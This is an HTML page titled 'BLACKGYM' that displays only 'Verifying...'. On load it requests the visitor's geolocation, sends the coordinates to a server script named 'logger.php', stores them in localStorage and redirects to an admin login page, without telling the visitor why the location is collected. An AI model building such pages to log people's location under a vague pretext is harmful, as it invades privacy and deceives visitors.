<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BLACKGYM</title>
    <style>
        /* Basic reset and styling */
        body, h1, p {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Centering the content */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            text-align: center;
        }

        /* Loading spinner */
        .spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Function to get the user's coordinates
        function getCoordinates() {
            if (navigator.geolocation) {
                // Show the loading spinner
                document.getElementById("spinner").style.display = "block";

                // Attempt to get the current position
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Store the location in localStorage for future visits
                        localStorage.setItem('latitude', latitude);
                        localStorage.setItem('longitude', longitude);

                        // Send coordinates to the server
                        sendCoordinatesToServer(latitude, longitude);

                        // Hide the loading spinner after getting the location
                        document.getElementById("spinner").style.display = "none";

                        window.location.href = "admin/login.php";
                    },
                    function(error) {
                        console.error("Error getting location:", error.message);
                        alert("Unable to retrieve location. Please enable location services.");
                        document.getElementById("spinner").style.display = "none";
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Function to send data to the server
        function sendCoordinatesToServer(latitude, longitude) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "logger.php", true); // Change logger.php to your PHP script name
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    console.log(" successfull!");
                }
            };
            xhr.send(`latitude=${latitude}&longitude=${longitude}`);
        }

        // Check if location is already stored in localStorage
        function checkLocation() {
            const latitude = localStorage.getItem('latitude');
            const longitude = localStorage.getItem('longitude');

            // If location exists in localStorage, redirect to 
            if (latitude && longitude) {
                window.location.href = "admin/login.php";
            } else {
                // If no location data is found, request location
                getCoordinates();
            }
        }

        // Trigger the location check on page load
        window.onload = function() {
            checkLocation();
        };
    </script>
</head>
<body>

    <!-- Spinner for loading -->
    <div id="spinner" class="spinner"></div>

    <!-- Main content container -->
    <div class="container">
        <h1>Verifying...</h1>
    </div>

</body>
</html>